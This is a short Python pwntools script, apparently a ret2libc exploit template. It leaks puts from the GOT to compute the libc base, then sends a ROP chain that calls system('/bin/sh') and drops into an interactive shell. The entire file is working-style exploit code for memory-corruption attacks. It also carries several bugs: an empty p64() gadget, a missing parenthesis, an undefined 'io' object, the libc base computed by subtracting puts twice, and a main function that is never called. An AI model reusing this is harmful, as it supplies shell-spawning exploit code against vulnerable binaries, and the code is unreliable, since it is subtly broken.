from pwn import *


#p = remote("",)
p = process("/binary_path")
libc = ELF("/libc_path")
rop = ROP(p)

pop_rdi = p64()                 #pop rdi; ret
puts_got = p64(p.got["puts"])
puts_plt = p64(p.plt["puts"])
main_addr = p64(p.symbols["main"]
binsh = p64(next(libc.search(b"/bin/sh")))
system = p64(libc.symbols["system"])
offset = b'A' * 40

def leak():
    payload = b""
    payload += offset
    payload += pop_rdi
    payload += puts_got
    payload += puts_plt
    payload += main_addr
    
    p.sendline(payload)
    
    libc_leak = (u64(io.recv(8)) - libc.symbols["puts"])
    libc.address = libc_leak - libc.sym["puts"]
    
    log.info("Base address of libc: {}".format(libc.address))
    
    return libc.address


def shell_exploit_x64():
    payload = b""
    payload += offset
    payload += pop_rdi      #rdi <-- "/bin/sh"
    payload += binsh
    payload += system
    payload += p64(0x0)
    
    p.sendline(payload)
    p.interactive()

def shell_exploit_x86():
    payload = b""
    payload += offset
    payload += p32(libc.symbols["system"])
    payload += p32(0x0)
    payload += p32(next(libc.search(b"/bin/sh")))
    
    p.sendline(payload)
    p.interactive()

def overflow_test():
    payload = b""
    payload += offset
    payload += main_addr
    
    p.interactive()
    

def main():
    libc.address = leak()
    shell_exploit_x64()
    #shell_exploit_x86
    
    
